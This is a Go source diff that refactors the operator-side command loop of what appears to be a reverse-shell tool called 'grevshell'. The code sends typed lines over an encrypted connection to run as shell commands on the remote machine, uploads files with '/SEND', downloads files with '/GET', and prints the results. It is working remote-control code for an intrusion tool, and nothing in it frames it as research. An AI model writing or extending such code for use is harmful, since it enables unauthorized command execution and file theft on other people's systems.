@@ -5,9 +5,8 @@ import (
 	"fmt"
 	"bufio"
 	"os"
-	"strings"
-	"encoding/binary"
 	"path/filepath"
+	"strings"
 	"net"
 
 	"grevshell/grevcore"
@@ -39,6 +38,7 @@ func ProcessLoop(c net.Conn, key []byte) {
 	defer c.Close()
 
 	for {
+		var packet grevcore.Packet
 		fmt.Printf("%s - $ ", c.RemoteAddr())
 		line, err := send.ReadString('\n')
 
@@ -55,58 +55,56 @@ func ProcessLoop(c net.Conn, key []byte) {
 
 		switch fields[0] {
 		case "/SEND":
-			filename := fields[1]
-			filenameSize := len(filename)
+			packet.Header = grevcore.FileReceiveHeader
 
+			filename := fields[1]
 			data, err := os.ReadFile(filename)
 
 			if err != nil {
 				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
 				break;
 			}
-			toSend := make([]byte, 8 + 2 + filenameSize + len(data))
 
-			copy(toSend[:8], []byte(grevcore.FileReceiveHeader))
-			binary.LittleEndian.PutUint16(toSend[8:10], uint16(filenameSize))
-			copy(toSend[10:10 + filenameSize], []byte(filename))
-			copy(toSend[10 + filenameSize:], data)
-
-			grevcore.SendPacket(c, toSend, key)
+			packet.FileName = filename
+			packet.Data = data 
 
 		case "/GET":
+			packet.Header = grevcore.FileSendHeader
 			filename := fields[1]
-			filenameSize := len(filename)
 
-			toSend := make([]byte, 8 + 2 + filenameSize)
-
-			copy(toSend[:8], []byte(grevcore.FileSendHeader))
-			binary.LittleEndian.PutUint16(toSend[8:10], uint16(filenameSize))
-			copy(toSend[10:10 + filenameSize], []byte(filename))
-
-			grevcore.SendPacket(c, toSend, key)
-			data := grevcore.ReceivePacket(c, key)
-
-			err := os.WriteFile(filepath.Base(filename), data[2 + filenameSize:], 0600)
-
-			if err != nil {
-				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
-			}
+			packet.FileName = filename
 
 		case "/EXIT":
 			return
 
+		case "/CANCEL":
+			packet.Data = []byte("\x03")
+
 		default:
-			lineByte := []byte(line)
-			toSend := make([]byte, 8 + len(lineByte))
-
-			copy(toSend[:8], []byte(grevcore.ShellExecHeader))
-			copy(toSend[8:], lineByte)
-
-			grevcore.SendPacket(c, toSend, key)
-
-			resp := string(grevcore.ReceivePacket(c, key))
-
-			fmt.Println(strings.TrimSpace(resp))
+			packet.Header = grevcore.ShellExecHeader
+			packet.Data = []byte(line)
 		}
+
+		grevcore.SendPacket(c, packet, key)
+		recv := grevcore.ReceivePacket(c, key)
+
+		if recv.Data == nil {
+			return
+		}
+
+		switch recv.Header {
+		case grevcore.FileReceiveHeader:
+			slog.Info("Writing file.", "FILE", filepath.Base(recv.FileName))
+			err := os.WriteFile(filepath.Base(recv.FileName), recv.Data, 0600)
+
+			if err != nil {
+				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
+				return
+			}
+
+		default:
+			fmt.Printf("%s\n", recv.Data)
+		}
+
 	}
 }
